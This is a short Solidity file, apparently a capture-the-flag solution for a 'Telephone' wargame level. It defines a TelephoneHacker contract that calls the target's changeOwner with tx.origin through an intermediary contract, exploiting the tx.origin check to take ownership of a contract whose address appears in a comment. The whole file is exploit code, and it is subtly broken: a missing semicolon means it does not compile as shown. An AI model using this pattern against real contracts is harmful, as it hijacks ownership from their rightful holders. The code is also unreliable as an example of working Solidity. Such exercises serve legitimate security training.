pragma solidity ^0.4.18;

// 0x687479cce299dd2ec3ea9a9392f366e846254913
import 'Telephone.sol';
contract TelephoneHacker {
  Telephone telephone;

  function TelephoneHacker(address aimAddr) public {
    telephone = Telephone(aimAddr);
  }

  function changeOwner() public {
    telephone.changeOwner(tx.origin)
  }
}